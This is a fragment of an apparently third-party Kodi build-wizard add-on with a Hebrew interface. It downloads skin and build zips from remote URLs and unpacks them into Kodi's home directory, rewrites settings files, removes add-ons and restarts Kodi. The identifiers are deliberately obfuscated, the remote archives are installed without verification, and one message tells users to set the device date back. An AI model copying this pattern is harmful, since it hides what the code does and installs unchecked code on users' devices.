			if len (OO0O00OOO0OOO00O0 )>0 :#line:4128
				O0O0000O00000OO00 ='%s-%s.zip'%(SKINID18 ,OO0O00OOO0OOO00O0 [0 ])#line:4129
				OOOOO00OO000O0000 =wiz .workingURL (SKIN18ZIPURL +O0O0000O00000OO00 )#line:4130
				if OOOOO00OO000O0000 ==True :#line:4131
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4132
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4133
					OOO0OO00OOO0O0OO0 =os .path .join (PACKAGES ,O0O0000O00000OO00 )#line:4134
					try :os .remove (OOO0OO00OOO0O0OO0 )#line:4135
					except :pass #line:4136
					downloader .download (SKIN18ZIPURL +O0O0000O00000OO00 ,OOO0OO00OOO0O0OO0 ,DP )#line:4137
					extract .all (OOO0OO00OOO0O0OO0 ,HOME ,DP )#line:4138
					try :#line:4139
						O0OOO0OOO0O0O00OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4140
						OOOOOO0O00000O000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4141
						os .rename (O0OOO0OOO0O0O00OO ,OOOOOO0O00000O000 )#line:4142
					except :#line:4143
						pass #line:4144
					try :#line:4145
						O000OO0O0O0000OOO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0O0OO000000OO0OO =O000OO0O0O0000OOO .read ();O000OO0O0O0000OOO .close ()#line:4146
						OO0OO0OO00000000O =wiz .parseDOM (O0O0OO000000OO0OO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4147
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0OO00000000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4148
					except :#line:4149
						pass #line:4150
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4151
					DP .close ()#line:4152
					xbmc .sleep (500 )#line:4153
					wiz .forceUpdate (True )#line:4154
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4155
				else :#line:4156
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4157
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOO00OO000O0000 ,xbmc .LOGERROR )#line:4158
			else :#line:4159
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4160
		else :#line:4161
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4162
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4163
def skinfix17 ():#line:4164
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4165
		OO000OOO000O00OOO =wiz .workingURL (SKINID17DDONXML )#line:4166
		if OO000OOO000O00OOO ==True :#line:4167
			O0OO0OO00O00OOOOO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4168
			if len (O0OO0OO00O00OOOOO )>0 :#line:4169
				O00OOO0O000000000 ='%s-%s.zip'%(SKINID17 ,O0OO0OO00O00OOOOO [0 ])#line:4170
				OOOOOOOOO00O00OO0 =wiz .workingURL (SKIN17ZIPURL +O00OOO0O000000000 )#line:4171
				if OOOOOOOOO00O00OO0 ==True :#line:4172
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4173
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4174
					O0OO00000000O0O0O =os .path .join (PACKAGES ,O00OOO0O000000000 )#line:4175
					try :os .remove (O0OO00000000O0O0O )#line:4176
					except :pass #line:4177
					downloader .download (SKIN17ZIPURL +O00OOO0O000000000 ,O0OO00000000O0O0O ,DP )#line:4178
					extract .all (O0OO00000000O0O0O ,HOME ,DP )#line:4179
					try :#line:4180
						OOO0OO00000000OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4181
						OOO000OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4182
						os .rename (OOO0OO00000000OO0 ,OOO000OO000O00000 )#line:4183
					except :#line:4184
						pass #line:4185
					try :#line:4186
						OOO000O00O0O0O000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOO00000O00OO0O00 =OOO000O00O0O0O000 .read ();OOO000O00O0O0O000 .close ()#line:4187
						OO0O0OOO0O00OO000 =wiz .parseDOM (OOO00000O00OO0O00 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4188
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOO0O00OO000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4189
					except :#line:4190
						pass #line:4191
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4192
					DP .close ()#line:4193
					xbmc .sleep (500 )#line:4194
					wiz .forceUpdate (True )#line:4195
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4196
				else :#line:4197
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4198
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOOOOOO00O00OO0 ,xbmc .LOGERROR )#line:4199
			else :#line:4200
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4201
		else :#line:4202
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4203
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4204
def fix17update ():#line:4205
	if KODIV >=17 and KODIV <18 :#line:4206
		wiz .kodi17Fix ()#line:4207
		xbmc .sleep (4000 )#line:4208
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4209
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4210
		fixfont ()#line:4211
		OOOO0O0OOO0O00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4212
		try :#line:4214
			OO0OOO0OO0OOO000O =open (OOOO0O0OOO0O00OO0 ,'r')#line:4215
			OO0OOO00OO00OO000 =OO0OOO0OO0OOO000O .read ()#line:4216
			OO0OOO0OO0OOO000O .close ()#line:4217
			OOOO0O0OO0OO0O000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4218
			OOOO0OOO0OO0OO000 =re .compile (OOOO0O0OO0OO0O000 ).findall (OO0OOO00OO00OO000 )[0 ]#line:4219
			OO0OOO0OO0OOO000O =open (OOOO0O0OOO0O00OO0 ,'w')#line:4220
			OO0OOO0OO0OOO000O .write (OO0OOO00OO00OO000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOO0OOO0OO0OO000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4221
			OO0OOO0OO0OOO000O .close ()#line:4222
		except :#line:4223
				pass #line:4224
		wiz .kodi17Fix ()#line:4225
		OOOO0O0OOO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4226
		try :#line:4227
			OO0OOO0OO0OOO000O =open (OOOO0O0OOO0O00OO0 ,'r')#line:4228
			OO0OOO00OO00OO000 =OO0OOO0OO0OOO000O .read ()#line:4229
			OO0OOO0OO0OOO000O .close ()#line:4230
			OOOO0O0OO0OO0O000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4231
			OOOO0OOO0OO0OO000 =re .compile (OOOO0O0OO0OO0O000 ).findall (OO0OOO00OO00OO000 )[0 ]#line:4232
			OO0OOO0OO0OOO000O =open (OOOO0O0OOO0O00OO0 ,'w')#line:4233
			OO0OOO0OO0OOO000O .write (OO0OOO00OO00OO000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOO0OOO0OO0OO000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4234
			OO0OOO0OO0OOO000O .close ()#line:4235
		except :#line:4236
				pass #line:4237
		swapSkins ('skin.Premium.mod')#line:4238
def fix18update ():#line:4240
	if KODIV >=18 :#line:4241
		xbmc .sleep (4000 )#line:4242
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4243
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4244
		fixfont ()#line:4245
		OO00OOOO00OO00O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4246
		try :#line:4247
			O0O00OOOOOO000000 =open (OO00OOOO00OO00O00 ,'r')#line:4248
			O0O0OOO00O000OOOO =O0O00OOOOOO000000 .read ()#line:4249
			O0O00OOOOOO000000 .close ()#line:4250
			O00000OOOO0000OO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4251
			O0O0OOOO0O0OOO000 =re .compile (O00000OOOO0000OO0 ).findall (O0O0OOO00O000OOOO )[0 ]#line:4252
			O0O00OOOOOO000000 =open (OO00OOOO00OO00O00 ,'w')#line:4253
			O0O00OOOOOO000000 .write (O0O0OOO00O000OOOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0O0OOOO0O0OOO000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4254
			O0O00OOOOOO000000 .close ()#line:4255
		except :#line:4256
				pass #line:4257
		wiz .kodi17Fix ()#line:4258
		OO00OOOO00OO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4259
		try :#line:4260
			O0O00OOOOOO000000 =open (OO00OOOO00OO00O00 ,'r')#line:4261
			O0O0OOO00O000OOOO =O0O00OOOOOO000000 .read ()#line:4262
			O0O00OOOOOO000000 .close ()#line:4263
			O00000OOOO0000OO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4264
			O0O0OOOO0O0OOO000 =re .compile (O00000OOOO0000OO0 ).findall (O0O0OOO00O000OOOO )[0 ]#line:4265
			O0O00OOOOOO000000 =open (OO00OOOO00OO00O00 ,'w')#line:4266
			O0O00OOOOOO000000 .write (O0O0OOO00O000OOOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0O0OOOO0O0OOO000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4267
			O0O00OOOOOO000000 .close ()#line:4268
		except :#line:4269
				pass #line:4270
		swapSkins ('skin.Premium.mod')#line:4271
def buildWizard (OOOO0O000O0O00O00 ,O00OO00000OO00OO0 ,theme =None ,over =False ):#line:4274
	O00OO0O000OO0OOOO =xbmcgui .DialogBusy ()#line:4275
	O00OO0O000OO0OOOO .create ()#line:4276
	if over ==False :#line:4277
		O0O000OO000O0000O =wiz .checkBuild (OOOO0O000O0O00O00 ,'url')#line:4278
		if USERNAME =='':#line:4279
			ADDON .openSettings ()#line:4280
			sys .exit ()#line:4281
		if PASSWORD =='':#line:4282
			ADDON .openSettings ()#line:4283
			sys .exit ()#line:4284
		if BUILDNAME =='':#line:4286
			OO000OOO0OO0000O0 =u_list (SPEEDFILE )#line:4287
			(OO000OOO0OO0000O0 )#line:4288
		if O0O000OO000O0000O ==False :#line:4289
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4294
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:4295
			return #line:4296
		O00O00O00O0O00O0O =wiz .workingURL (O0O000OO000O0000O )#line:4297
		if O00O00O00O0O00O0O ==False :#line:4298
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00O00O00O0O00O0O ))#line:4299
			return #line:4300
	if O00OO00000OO00OO0 =='gui':#line:4301
		if OOOO0O000O0O00O00 ==BUILDNAME :#line:4302
			if over ==True :OO000O000OOO0O0OO =1 #line:4303
			else :OO000O000OOO0O0OO =1 #line:4304
		else :#line:4305
			OO000O000OOO0O0OO =1 #line:4306
		if OO000O000OOO0O0OO :#line:4307
			remove_addons ()#line:4308
			remove_addons2 ()#line:4309
			debridit .debridIt ('update','all')#line:4310
			traktit .traktIt ('update','all')#line:4311
			OOO00OO00000OOOOO =wiz .checkBuild (OOOO0O000O0O00O00 ,'gui')#line:4312
			O000O000OOO00OOOO =OOOO0O000O0O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4313
			if not wiz .workingURL (OOO00OO00000OOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4314
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4315
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O000O0O00O00 ),'','אנא המתן')#line:4316
			OOO0O0000O0OOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000O000OOO00OOOO )#line:4317
			try :os .remove (OOO0O0000O0OOO0OO )#line:4318
			except :pass #line:4319
			logging .warning (OOO00OO00000OOOOO )#line:4320
			if 'google'in OOO00OO00000OOOOO :#line:4321
			   O0OOO0O000OOO0OOO =googledrive_download (OOO00OO00000OOOOO ,OOO0O0000O0OOO0OO ,DP ,wiz .checkBuild (OOOO0O000O0O00O00 ,'filesize'))#line:4322
			else :#line:4325
			  downloader .download (OOO00OO00000OOOOO ,OOO0O0000O0OOO0OO ,DP )#line:4326
			xbmc .sleep (100 )#line:4327
			OOO0O0O0OOOOOOOO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O000O0O00O00 )#line:4328
			DP .update (0 ,OOO0O0O0OOOOOOOO0 ,'','אנא המתן')#line:4329
			extract .all (OOO0O0000O0OOO0OO ,HOME ,DP ,title =OOO0O0O0OOOOOOOO0 )#line:4330
			DP .close ()#line:4331
			wiz .defaultSkin ()#line:4332
			wiz .lookandFeelData ('save')#line:4333
			wiz .kodi17Fix ()#line:4334
			if KODIV >=18 :#line:4335
				skindialogsettind18 ()#line:4336
			debridit .debridIt ('restore','all')#line:4337
			traktit .traktIt ('restore','all')#line:4338
			if INSTALLMETHOD ==1 :O0O0OO00000OO00O0 =1 #line:4340
			elif INSTALLMETHOD ==2 :O0O0OO00000OO00O0 =0 #line:4341
			else :DP .close ()#line:4342
			OO0OO00OO000OOOOO =(NOTIFICATION2 )#line:4343
			O0O0O000OOOOOOO00 =urllib2 .urlopen (OO0OO00OO000OOOOO )#line:4344
			OOO0O00OOO0O00OOO =O0O0O000OOOOOOO00 .readlines ()#line:4345
			O0000O0OOOOOOO000 =0 #line:4346
			for O0O00000000O00O00 in OOO0O00OOO0O00OOO :#line:4349
				if O0O00000000O00O00 .split (' ==')[0 ]=="noreset"or O0O00000000O00O00 .split ()[0 ]=="noreset":#line:4350
					xbmc .executebuiltin ("ReloadSkin()")#line:4352
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4353
					update_Votes ()#line:4354
					indicatorfastupdate ()#line:4355
				if O0O00000000O00O00 .split (' ==')[0 ]=="reset"or O0O00000000O00O00 .split ()[0 ]=="reset":#line:4356
					update_Votes ()#line:4358
					indicatorfastupdate ()#line:4359
					resetkodi ()#line:4360
		else :#line:4369
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4370
	if O00OO00000OO00OO0 =='gui2':#line:4371
		if OOOO0O000O0O00O00 ==BUILDNAME :#line:4372
			if over ==True :OO000O000OOO0O0OO =1 #line:4373
			else :OO000O000OOO0O0OO =1 #line:4374
		else :#line:4375
			OO000O000OOO0O0OO =1 #line:4376
		if OO000O000OOO0O0OO :#line:4377
			remove_addons ()#line:4378
			remove_addons2 ()#line:4379
			OOO00OO00000OOOOO =wiz .checkBuild (OOOO0O000O0O00O00 ,'gui')#line:4380
			O000O000OOO00OOOO =OOOO0O000O0O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4381
			if not wiz .workingURL (OOO00OO00000OOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4382
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4383
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O000O0O00O00 ),'','אנא המתן')#line:4384
			OOO0O0000O0OOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000O000OOO00OOOO )#line:4385
			try :os .remove (OOO0O0000O0OOO0OO )#line:4386
			except :pass #line:4387
			logging .warning (OOO00OO00000OOOOO )#line:4388
			if 'google'in OOO00OO00000OOOOO :#line:4389
			   O0OOO0O000OOO0OOO =googledrive_download (OOO00OO00000OOOOO ,OOO0O0000O0OOO0OO ,DP ,wiz .checkBuild (OOOO0O000O0O00O00 ,'filesize'))#line:4390
			else :#line:4393
			  downloader .download (OOO00OO00000OOOOO ,OOO0O0000O0OOO0OO ,DP )#line:4394
			xbmc .sleep (100 )#line:4395
			OOO0O0O0OOOOOOOO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O000O0O00O00 )#line:4396
			DP .update (0 ,OOO0O0O0OOOOOOOO0 ,'','אנא המתן')#line:4397
			extract .all (OOO0O0000O0OOO0OO ,HOME ,DP ,title =OOO0O0O0OOOOOOOO0 )#line:4398
			DP .close ()#line:4399
			wiz .defaultSkin ()#line:4400
			wiz .lookandFeelData ('save')#line:4401
			if INSTALLMETHOD ==1 :O0O0OO00000OO00O0 =1 #line:4404
			elif INSTALLMETHOD ==2 :O0O0OO00000OO00O0 =0 #line:4405
			else :DP .close ()#line:4406
		else :#line:4408
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4409
	elif O00OO00000OO00OO0 =='fresh':#line:4410
		freshStart (OOOO0O000O0O00O00 )#line:4411
	elif O00OO00000OO00OO0 =='normal':#line:4412
		if url =='normal':#line:4413
			if KEEPTRAKT =='true':#line:4414
				traktit .autoUpdate ('all')#line:4415
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4416
			if KEEPREAL =='true':#line:4417
				debridit .autoUpdate ('all')#line:4418
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4419
			if KEEPLOGIN =='true':#line:4420
				loginit .autoUpdate ('all')#line:4421
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4422
		O0000OO0O0O0O0OOO =int (KODIV );OO0O00O0O0OOOO000 =int (float (wiz .checkBuild (OOOO0O000O0O00O00 ,'kodi')))#line:4423
		if not O0000OO0O0O0O0OOO ==OO0O00O0O0OOOO000 :#line:4424
			if O0000OO0O0O0O0OOO ==16 and OO0O00O0O0OOOO000 <=15 :O00000O00000O000O =False #line:4425
			else :O00000O00000O000O =True #line:4426
		else :O00000O00000O000O =False #line:4427
		if O00000O00000O000O ==True :#line:4428
			O000000OOO0OO0OO0 =1 #line:4429
		else :#line:4430
			if not over ==False :O000000OOO0OO0OO0 =1 #line:4431
			else :O000000OOO0OO0OO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4432
		if O000000OOO0OO0OO0 :#line:4433
			wiz .clearS ('build')#line:4434
			OOO00OO00000OOOOO =wiz .checkBuild (OOOO0O000O0O00O00 ,'url')#line:4435
			O000O000OOO00OOOO =OOOO0O000O0O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4436
			if not wiz .workingURL (OOO00OO00000OOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4437
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4438
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OOOO0O000O0O00O00 ,wiz .checkBuild (OOOO0O000O0O00O00 ,'version')),'','אנא המתן')#line:4439
			OOO0O0000O0OOO0OO =os .path .join (PACKAGES ,'%s.zip'%O000O000OOO00OOOO )#line:4440
			try :os .remove (OOO0O0000O0OOO0OO )#line:4441
			except :pass #line:4442
			logging .warning (OOO00OO00000OOOOO )#line:4443
			if 'google'in OOO00OO00000OOOOO :#line:4444
			   O0OOO0O000OOO0OOO =googledrive_download (OOO00OO00000OOOOO ,OOO0O0000O0OOO0OO ,DP ,wiz .checkBuild (OOOO0O000O0O00O00 ,'filesize'))#line:4445
			else :#line:4448
			  downloader .download (OOO00OO00000OOOOO ,OOO0O0000O0OOO0OO ,DP )#line:4449
			xbmc .sleep (1000 )#line:4450
			OOO0O0O0OOOOOOOO0 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O000O0O00O00 ,wiz .checkBuild (OOOO0O000O0O00O00 ,'version'))#line:4451
			DP .update (0 ,OOO0O0O0OOOOOOOO0 ,'','אנא המתן...')#line:4452
			OO0O000OO00000OOO ,O0O00OO0OOO0OO00O ,O0O0OOOOO0000OO00 =extract .all (OOO0O0000O0OOO0OO ,HOME ,DP ,title =OOO0O0O0OOOOOOOO0 )#line:4453
			if int (float (OO0O000OO00000OOO ))>0 :#line:4454
				try :#line:4455
					wiz .fixmetas ()#line:4456
				except :pass #line:4457
				wiz .lookandFeelData ('save')#line:4458
				wiz .defaultSkin ()#line:4459
				wiz .setS ('buildname',OOOO0O000O0O00O00 )#line:4461
				wiz .setS ('buildversion',wiz .checkBuild (OOOO0O000O0O00O00 ,'version'))#line:4462
				wiz .setS ('buildtheme','')#line:4463
				wiz .setS ('latestversion',wiz .checkBuild (OOOO0O000O0O00O00 ,'version'))#line:4464
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4465
				wiz .setS ('installed','true')#line:4466
				wiz .setS ('extract',str (OO0O000OO00000OOO ))#line:4467
				wiz .setS ('errors',str (O0O00OO0OOO0OO00O ))#line:4468
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0O000OO00000OOO ,O0O00OO0OOO0OO00O ))#line:4469
				fastupdatefirstbuild (NOTEID )#line:4470
				wiz .kodi17Fix ()#line:4471
				skin_homeselect ()#line:4472
				skin_lower ()#line:4473
				kodi17to18 ()#line:4478
				try :os .remove (OOO0O0000O0OOO0OO )#line:4480
				except :pass #line:4481
				DP .close ()#line:4501
				OOOOO0OOOOOOOOOOO =wiz .themeCount (OOOO0O000O0O00O00 )#line:4502
				builde_Votes ()#line:4503
				indicator ()#line:4504
				if not OOOOO0OOOOOOOOOOO ==False :#line:4505
					buildWizard (OOOO0O000O0O00O00 ,'theme')#line:4506
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4507
				if INSTALLMETHOD ==1 :O0O0OO00000OO00O0 =1 #line:4508
				elif INSTALLMETHOD ==2 :O0O0OO00000OO00O0 =0 #line:4509
				else :resetkodi ()#line:4510
				if O0O0OO00000OO00O0 ==1 :wiz .reloadFix ()#line:4512
				else :wiz .killxbmc (True )#line:4513
			else :#line:4514
				if isinstance (O0O00OO0OOO0OO00O ,unicode ):#line:4515
					O0O0OOOOO0000OO00 =O0O0OOOOO0000OO00 .encode ('utf-8')#line:4516
				O000O00O0000O00O0 =open (OOO0O0000O0OOO0OO ,'r')#line:4517
				O00OOOO000OO00OOO =O000O00O0000O00O0 .read ()#line:4518
				OO0OOOOOO000O00O0 =''#line:4519
				for OO0OOO000O0O0000O in O0OOO0O000OOO0OOO :#line:4520
				  OO0OOOOOO000O00O0 ='key: '+OO0OOOOOO000O00O0 +'\n'+OO0OOO000O0O0000O #line:4521
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0OOOOO0000OO00 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0OOOOOO000O00O0 )#line:4522
		else :#line:4523
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4524
	elif O00OO00000OO00OO0 =='theme':#line:4525
		if theme ==None :#line:4526
			OOOOO0OOOOOOOOOOO =wiz .checkBuild (OOOO0O000O0O00O00 ,'theme')#line:4527
			O0OOO00O0OO0O0O0O =[]#line:4528
			if not OOOOO0OOOOOOOOOOO =='http://'and wiz .workingURL (OOOOO0OOOOOOOOOOO )==True :#line:4529
				O0OOO00O0OO0O0O0O =wiz .themeCount (OOOO0O000O0O00O00 ,False )#line:4530
				if len (O0OOO00O0OO0O0O0O )>0 :#line:4531
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOO0O000O0O00O00 ,COLOR1 ,len (O0OOO00O0OO0O0O0O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4532
						wiz .log ("Theme List: %s "%str (O0OOO00O0OO0O0O0O ))#line:4533
						O00000OO000OOOOO0 =DIALOG .select (ADDONTITLE ,O0OOO00O0OO0O0O0O )#line:4534
						wiz .log ("Theme install selected: %s"%O00000OO000OOOOO0 )#line:4535
						if not O00000OO000OOOOO0 ==-1 :theme =O0OOO00O0OO0O0O0O [O00000OO000OOOOO0 ];O000OOOOOOOO0O000 =True #line:4536
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4537
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4538
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4539
		else :O000OOOOOOOO0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOO0O000O0O00O00 ,wiz .checkBuild (OOOO0O000O0O00O00 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4540
		if O000OOOOOOOO0O000 :#line:4541
			O00O0O0OO0OOOO000 =wiz .checkTheme (OOOO0O000O0O00O00 ,theme ,'url')#line:4542
			O000O000OOO00OOOO =OOOO0O000O0O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4543
			if not wiz .workingURL (O00O0O0OO0OOOO000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4544
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4545
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4546
